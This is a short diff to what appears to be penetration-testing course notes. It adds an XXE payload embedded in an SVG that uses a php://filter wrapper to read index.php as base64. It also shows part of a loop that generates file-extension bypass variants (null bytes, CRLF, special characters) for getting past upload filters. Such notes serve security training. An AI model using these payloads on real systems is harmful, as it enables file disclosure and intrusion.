@@ -117,6 +117,15 @@ Value Fuzzing (POST):         ffuf -w /usr/share/seclists/Usernames/xato-net-10-
 #### Skills Assessment :
 
 
+
+
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
 ```
 for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
     for ext in '.php' '.phps'; do
@@ -127,3 +136,4 @@ for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
     done
 done
 ```
+
